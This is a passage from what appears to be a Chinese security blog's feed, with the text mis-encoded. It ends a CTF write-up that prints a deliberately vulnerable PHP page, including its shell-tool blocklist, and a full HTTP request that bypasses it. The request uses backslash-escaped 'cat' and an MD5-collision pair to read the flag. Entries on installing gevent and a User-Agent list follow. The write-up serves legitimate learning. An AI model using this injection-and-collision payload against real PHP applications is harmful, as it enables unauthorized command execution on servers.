<code>TmprMlpUWTBOalUzT0RKbE56QTJPRGN3</code><br>ç„¶åæäº¤åˆ°URLï¼Œå¾—åˆ° <code>index.php</code> çš„æºç </p><h2 id="index-php"><a href="#index-php" class="headerlink" title="index.php"></a>index.php</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(E_ALL || ~ E_NOTICE);</span><br><span class="line">header(<span class="string">'content-type:text/html;charset=utf-8'</span>);</span><br><span class="line">$cmd = $_GET[<span class="string">'cmd'</span>];</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($_GET[<span class="string">'img'</span>]) || !<span class="keyword">isset</span>($_GET[<span class="string">'cmd'</span>])) </span><br><span class="line">    header(<span class="string">'Refresh:0;url=./index.php?img=TXpVek5UTTFNbVUzTURabE5qYz0&amp;cmd='</span>);</span><br><span class="line">$file = hex2bin(base64_decode(base64_decode($_GET[<span class="string">'img'</span>])));</span><br><span class="line"></span><br><span class="line">$file = preg_replace(<span class="string">"/[^a-zA-Z0-9.]+/"</span>, <span class="string">""</span>, $file);</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/flag/i"</span>, $file)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">'&lt;img src ="./ctf3.jpeg"&gt;'</span>;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"xixiï½ no flag"</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    $txt = base64_encode(file_get_contents($file));</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;img src='data:image/gif;base64,"</span> . $txt . <span class="string">"'&gt;&lt;/img&gt;"</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> $cmd;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line"><span class="keyword">if</span> (preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)) &#123;</span><br><span class="line">    <span class="keyword">echo</span>(<span class="string">"forbid ~"</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>])) &#123;</span><br><span class="line">        <span class="keyword">echo</span> `$cmd`;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">echo</span> (<span class="string">"md5 is funny ~"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;html&gt;</span><br><span class="line">&lt;style&gt;</span><br><span class="line">  body&#123;</span><br><span class="line">   background:url(./bj.png)  no-repeat center center;</span><br><span class="line">   background-size:cover;</span><br><span class="line">   background-attachment:fixed;</span><br><span class="line">   background-color:<span class="comment">#CCCCCC;</span></span><br><span class="line">&#125;</span><br><span class="line">&lt;/style&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure></div><p>ç„¶åæŸ¥çœ‹æºç </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">preg_match(<span class="string">"/flag/i"</span>, $file)</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">preg_match(<span class="string">"/ls|bash|tac|nl|more|less|head|wget|tail|vi|cat|od|grep|sed|bzmore|bzless|pcre|paste|diff|file|echo|sh|\'|\"|\`|;|,|\*|\?|\\|\\\\|\n|\t|\r|\xA0|\&#123;|\&#125;|\(|\)|\&amp;[^\d]|@|\||\\$|\[|\]|&#123;|&#125;|\(|\)|-|&lt;|&gt;/i"</span>, $cmd)</span><br></pre></td></tr></table></figure></div><p>æ­£åˆ™é™åˆ¶è®¸å¤šï¼Œä½†æ˜¯å‚è€ƒå¾®ç¬‘å¸ˆå‚…ä»¥å‰å†™çš„<a href="https://www.smi1e.top/%E5%91%BD%E4%BB%A4%E6%B3%A8%E5%85%A5%E7%BB%95%E8%BF%87%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">å‘½ä»¤æ³¨å…¥ç»•è¿‡</a>ï¼Œç»“åˆå‰å‡ å¤©çœ‹çš„<code>CVE-2014-6271</code>ï¼Œæ„é€ å¦‚ä¸‹payload</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd&#x3D;c\at%20&#x2F;flag</span><br></pre></td></tr></table></figure></div><p>å­˜åœ¨md5ç¢°æ’</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">php</div></div><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ((string)$_POST[<span class="string">'a'</span>] !== (string)$_POST[<span class="string">'b'</span>] &amp;&amp; md5($_POST[<span class="string">'a'</span>]) === md5($_POST[<span class="string">'b'</span>]))</span><br></pre></td></tr></table></figure></div><p>ç»•è¿‡æ–¹æ³•å‚è€ƒ <a href="https://blog.csdn.net/qq_19980431/article/details/83018232" target="_blank" rel="noopener">CTFä¸­å¸¸è§php-MD5()å‡½æ•°æ¼æ´</a></p><p>ç„¶åç”¨ <code>dir</code> æŸ¥çœ‹çš„æ—¶å€™ï¼Œå‘ç° <code>flag</code> ä¸åœ¨è¿™ä¸€ç›®å½•ï¼›</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv00xej314t0i7qaa.jpg" class="lazyload"></a></p><p>è·³è½¬åˆ°ä¸Šä¸€å±‚</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv2swwj316b0hcahm.jpg" class="lazyload"></a></p><p>æœ€åæ„é€ Payloadï¼š</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">POST</span> <span class="string">/index.php?cmd=/bin/c\at%20/flag</span> HTTP/1.1</span><br><span class="line"><span class="attribute">Host</span>: localhost</span><br><span class="line"><span class="attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:72.0) Gecko/20100101 Firefox/72.0</span><br><span class="line"><span class="attribute">Accept</span>: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line"><span class="attribute">Accept-Language</span>: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line"><span class="attribute">Accept-Encoding</span>: gzip, deflate</span><br><span class="line"><span class="attribute">Connection</span>: close</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span>: 1</span><br><span class="line"><span class="attribute">Cache-Control</span>: max-age=0</span><br><span class="line"><span class="attribute">Content-Type</span>: application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span>: 393</span><br><span class="line"></span><br><span class="line">a=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%00%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%55%5d%83%60%fb%5f%07%fe%a2</span><br><span class="line">&amp;b=%4d%c9%68%ff%0e%e3%5c%20%95%72%d4%77%7b%72%15%87%d3%6f%a7%b2%1b%dc%56%b7%4a%3d%c0%78%3e%7b%95%18%af%bf%a2%02%a8%28%4b%f3%6e%8e%4b%55%b3%5f%42%75%93%d8%49%67%6d%a0%d1%d5%5d%83%60%fb%5f%07%fe%a2</span><br></pre></td></tr></table></figure></div><p>ç„¶åå¾—åˆ°flag</p><hr><h1 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h1><p>æ–°å¢äº†é™ˆå¸ˆå‚…çš„å‹é“¾ï¼Œä»¥åä¹Ÿè¦å¤šæƒ³å¤§ä½¬å­¦ä¹ å­¦ä¹ <br><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbqexv5i14j308k08ot9j.jpg" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      æœ‰ä¸€è¯´ä¸€ï¼Œèµµå¸ˆå‚…å†™äº†botä¹‹åï¼ŒçœŸå°±é˜¿ç“¦è¾¾ç´¢å‘½24å°æ—¶ç£ä¿ƒå­¦ä¹  (å°å£°bbï¼Œå¸ˆå‚…ç†¬å¤œ4ç‚¹åšé¢˜å¤ªé¡¶äº†)
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="writeup" scheme="https://manayakko.github.io/yakko117/tags/writeup/"/>
    
      <category term="ctf" scheme="https://manayakko.github.io/yakko117/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>å…³äºPython ç¬¬ä¸‰æ–¹åº“ Gevent å®‰è£…é‡åˆ°çš„é—®é¢˜å’Œè§£å†³æ–¹æ³•</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/07/gevent/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/07/gevent/</id>
    <published>2020-02-07T05:43:02.286Z</published>
    <updated>2020-02-07T13:30:11.932Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>æœ€è¿‘æ‰¾åˆ°ä¸ª <code>TPscan</code> çš„è„šæœ¬å·¥å…·ï¼Œä½†æ˜¯ä¾èµ–åº“ç¼ºå¤±<br>æŒ‰ç€ç™¾åº¦çš„æ–¹æ³•è¯•äº†ä¸€å¤§å †éƒ½ä¸è¡Œï¼Œç„¶åè‡ªå·±æ‰¾ç‚¹å…¶ä»–çš„åŠæ³•æ¥è§£å†³</p><a id="more"></a><h1 id="pip-é‡åˆ°çš„é—®é¢˜"><a href="#pip-é‡åˆ°çš„é—®é¢˜" class="headerlink" title="pip é‡åˆ°çš„é—®é¢˜"></a>pip é‡åˆ°çš„é—®é¢˜</h1><h2 id="pipç‰ˆæœ¬å¤ªä½"><a href="#pipç‰ˆæœ¬å¤ªä½" class="headerlink" title="pipç‰ˆæœ¬å¤ªä½"></a>pipç‰ˆæœ¬å¤ªä½</h2><p>ä½¿ç”¨å‘½ä»¤ <code>pip install gevent</code> æ—¶ï¼Œ å›æ˜¾ </p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">You are using pip version 19.2.1, however version 20.0.2 is available</span><br></pre></td></tr></table></figure></div><p>è¿™ä¸ªç®€å•ï¼Œé€šè¿‡å‡çº§ pip å¯ä»¥è§£å†³</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -m pip install --upgrade pip</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jo5ncj306o03mt8o.jpg" class="lazyload"></a></p><hr><h2 id="è¶…æ—¶æŠ¥é”™-Read-timed-out"><a href="#è¶…æ—¶æŠ¥é”™-Read-timed-out" class="headerlink" title="è¶…æ—¶æŠ¥é”™ Read timed out"></a>è¶…æ—¶æŠ¥é”™ Read timed out</h2><p>è§£å†³äº† <code>pip</code> ç‰ˆæœ¬é—®é¢˜ä¹‹åï¼Œä½¿ç”¨ <code>pip</code> å®‰è£…ï¼Œ ç»“æœé£˜äº†ä¸€å¤§æ®µçº¢</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Traceback (most recent call last):</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">...</span><br><span class="line">pip._vendor.requests.packages.urllib3.exceptions.ReadTimeoutError: HTTPSConnectionPool(host&#x3D;&#39;pypi.python.org&#39;, port&#x3D;443): Read timed out.</span><br></pre></td></tr></table></figure></div><p>ä¼šå‡ºç°ä¸Šè¿°é—®é¢˜ï¼Œä¸»è¦æ˜¯å› ä¸ºç½‘ç»œé—®é¢˜ï¼ŒPythonä¾èµ–åº“éƒ½æ˜¯å¤–ç½‘çš„ï¼Œå°¤å…¶æ˜¯ç¬¬ä¸‰æ–¹çš„è¿™ç§å°ä½œåŠäº§å“ï¼Œå›½å†…è®¿é—®é€Ÿåº¦å¤ªæ…¢ï¼Œä¸‹è½½é“¾æ¥æ—¶æ–­æ—¶ç»­ï¼Œçœ‹äº†ç½‘ä¸Šçš„å‡ ç§è§£å†³æ–¹æ³•ï¼Œæ•ˆæœéƒ½ä¸€èˆ¬</p><h3 id="æ–¹æ³•ä¸€-è®¾ç½®è¶…æ—¶æ—¶é—´"><a href="#æ–¹æ³•ä¸€-è®¾ç½®è¶…æ—¶æ—¶é—´" class="headerlink" title="æ–¹æ³•ä¸€ è®¾ç½®è¶…æ—¶æ—¶é—´"></a>æ–¹æ³•ä¸€ è®¾ç½®è¶…æ—¶æ—¶é—´</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip --default-timeout&#x3D;100 install -U gevent(å¯¹åº”çš„æ˜¯ä¾èµ–åŒ…æ¨¡å—çš„åç§°)</span><br></pre></td></tr></table></figure></div><p>æˆ–è€…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install --default-timeout&#x3D;1000 --no-cache-dir -r requirements.txt</span><br></pre></td></tr></table></figure></div><p>ç„¶åå°±ä¼šå‘ç°ï¼Œè™½ç„¶ä¸ä¼šæŠ¥é”™äº†ï¼Œç»“æœä¹Ÿæ²¡æœ‰å…¶ä»–çš„å›æ˜¾äº†</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jpczej306o06o0sv.jpg" class="lazyload"></a></p><hr><h3 id="æ–¹æ³•äºŒ-pipæºæ›´æ¢"><a href="#æ–¹æ³•äºŒ-pipæºæ›´æ¢" class="headerlink" title="æ–¹æ³•äºŒ pipæºæ›´æ¢"></a>æ–¹æ³•äºŒ pipæºæ›´æ¢</h3><p>è¿™æ ·å°±èƒ½è§£å†³è¢«å¢™å¯¼è‡´çš„è£…ä¸ä¸Šåº“çš„çƒ¦æ¼ã€‚</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è±†ç“£ï¼šhttp:&#x2F;&#x2F;pypi.douban.com&#x2F;simple&#x2F;</span><br><span class="line"></span><br><span class="line">    æ¸…åï¼šhttps:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple</span><br></pre></td></tr></table></figure></div><p>é€šè¿‡ä½¿ç”¨æ¸…åæº çš„ç¡®ä¸‹è½½é€Ÿåº¦å¿«äº†ä¸å°‘</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple gevent</span><br></pre></td></tr></table></figure></div><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jol3pj30ii04rt98.jpg" class="lazyload"></a></p><p>ä½†è¿˜æ˜¯å®‰è£…ä¸ä¸Šï¼Œç„¶åæˆ‘ç›´æ¥ä»æºä¸‹è½½äº† <code>gevent</code> åŒ…<br>å‘ç°<code>gevent 1.4.0</code> çš„ç‰ˆæœ¬åªæ”¯æŒ<code>python 3.7</code>çš„ç‰ˆæœ¬ï¼Œæˆ‘çš„æ˜¯<code>python3.8</code> 32ä½çš„</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jnj5pj306o053gll.jpg" class="lazyload"></a></p><p><strong>ä¸€å®šè¦æ³¨æ„ç‰ˆæœ¬ï¼ æ³¨æ„ç‰ˆæœ¬ï¼ æ³¨æ„ç‰ˆæœ¬ï¼</strong></p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6joytoj309509nglm.jpg" class="lazyload"></a></p><p>ç„¶åç½‘ä¸Šæ‰¾åˆ°äº†é€‚åˆ3.8ç‰ˆæœ¬çš„ <code>gevent-1.5a3-cp38-cp38-win32.whl</code></p><p>ç„¶åç»è¿‡æ¼«é•¿çš„ç­‰å¾…å®‰è£…ï¼Œç»ˆäºå¥½äº†</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jqgiej30tk0bytg3.jpg" class="lazyload"></a></p><p>ç„¶åå°è¯•è·‘ä¸€éï¼Œå¯è¡Œï¼Œå°±å¾ˆèˆ’æœ</p><p><a href="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" data-fancybox="group" data-caption="test" class="fancybox"><img alt="test" title="test" data-src="https://cdn.jsdelivr.net/gh/Manayakko/PicBed/img/0077TIyQgy1gbns6jrc7dj309f06xt8l.jpg" class="lazyload"></a></p><hr><h1 id="ä¾èµ–åŒ…é—®é¢˜"><a href="#ä¾èµ–åŒ…é—®é¢˜" class="headerlink" title="ä¾èµ–åŒ…é—®é¢˜"></a>ä¾èµ–åŒ…é—®é¢˜</h1><p>ç„¶åé™¤äº†ä¸Šè¿°é—®é¢˜ä¹‹å¤–ï¼Œè¿˜å­˜åœ¨å…¶ä»–ä¾èµ–åŒ…é—®é¢˜<br>å¦‚æœè¦ç”¨ <code>gevent</code> åšç½‘ç»œå·¥ç¨‹<br>éœ€è¦æ·»åŠ å…¶ä»–ä¾èµ–åŒ…</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple greenlet</span><br><span class="line"></span><br><span class="line">pip install -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple libevent</span><br></pre></td></tr></table></figure></div>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;æœ€è¿‘æ‰¾åˆ°ä¸ª &lt;code&gt;TPscan&lt;/code&gt; çš„è„šæœ¬å·¥å…·ï¼Œä½†æ˜¯ä¾èµ–åº“ç¼ºå¤±&lt;br&gt;æŒ‰ç€ç™¾åº¦çš„æ–¹æ³•è¯•äº†ä¸€å¤§å †éƒ½ä¸è¡Œï¼Œç„¶åè‡ªå·±æ‰¾ç‚¹å…¶ä»–çš„åŠæ³•æ¥è§£å†³&lt;/p&gt;
    
    </summary>
    
    
      <category term="å­¦ä¹ ç¬”è®°" scheme="https://manayakko.github.io/yakko117/categories/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    
    
      <category term="çæ‰¯" scheme="https://manayakko.github.io/yakko117/tags/%E7%9E%8E%E6%89%AF/"/>
    
  </entry>
  
  <entry>
    <title>User-Agent å¤§å…¨</title>
    <link href="https://manayakko.github.io/yakko117/2020/02/05/User_agent/"/>
    <id>https://manayakko.github.io/yakko117/2020/02/05/User_agent/</id>
    <published>2020-02-05T12:52:55.402Z</published>
    <updated>2020-02-05T04:50:29.431Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\yakko117\assets\css\APlayer.min.css"><script src="\yakko117\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\yakko117\assets\js\Meting.min.js"></script><p>ç™¾åº¦æ•´ç†çš„(copy é›¾)</p><a id="more"></a><h1 id="PCç«¯"><a href="#PCç«¯" class="headerlink" title="PCç«¯"></a>PCç«¯</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang"></div></div><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Opera</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36 OPR/26.0.1656.60</span><br><span class="line">Opera/8.0 (Windows NT 5.1; U; en)</span><br><span class="line">Mozilla/5.0 (Windows NT 5.1; U; en; rv:1.8.1) Gecko/20061208 Firefox/2.0.0 Opera 9.50</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; en) Opera 9.50</span><br><span class="line"></span><br><span class="line"><span class="attribute">Firefox</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; rv:34.0) Gecko/20100101 Firefox/34.0</span><br><span class="line">Mozilla/5.0 (X11; U; Linux x86_64; zh-CN; rv:1.9.2.10) Gecko/20100922 Ubuntu/10.10 (maverick) Firefox/3.6.10</span><br><span class="line"></span><br><span class="line"><span class="attribute">Safari</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/534.57.2 (KHTML, like Gecko) Version/5.1.7 Safari/534.57.2</span><br><span class="line"></span><br><span class="line"><span class="attribute">chrome</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.71 Safari/537.36</span><br><span class="line">Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11</span><br><span class="line">Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US) AppleWebKit/534.16 (KHTML, like Gecko) Chrome/10.0.648.133 Safari/534.16</span><br><span class="line"></span><br><span class="line"><span class="attribute">360</span></span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/30.0.1599.101 Safari/537.36</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko</span><br><span class="line"></span><br><span class="line">æ·˜å®æµè§ˆå™¨</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/536.11 (KHTML, like Gecko) Chrome/20.0.1132.11 TaoBrowser/2.0 Safari/536.11</span><br><span class="line"></span><br><span class="line">çŒè±¹æµè§ˆå™¨</span><br><span class="line">Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.1 (KHTML, like Gecko) Chrome/21.0.1180.71 Safari/537.1 LBBROWSER</span><br><span class="line">Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; WOW64; Trident/5.0; SLCC2; .NET CLR 2.0.50727; .NET CLR 3.5.30729; .NET CLR 3.0.30729; Media Center PC 6.0; .NET4.0C; .NET4.0E; LBBROWSER)</span><br><span class="line">Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1; 